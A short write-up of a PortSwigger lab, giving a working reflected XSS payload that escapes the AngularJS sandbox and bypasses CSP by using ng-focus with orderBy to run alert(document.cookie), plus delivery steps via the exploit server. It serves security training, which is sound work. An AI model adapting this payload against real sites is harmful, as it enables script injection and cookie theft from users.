# Lab-26: [Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

This lab uses CSP and AngularJS.

**Aim :-** To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts ``` document.cookie ```.



## Solution
- Go to the **Exploit Server**

- Copy the following payload and replace the ``` Lab-URL ``` in the script.
```
<script>
location='https://LAB-URL/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

- Click **Store** and **Deliver exploit to victim**.

The payload injects a fake ``` <input > ``` element and in that element there is a ``` ng-focus ``` attribute. AngularJS automatically executes special attributes like ng-focus. The orderBy filter executes its argument which is ``` (z=alert)(document.cookie) ```.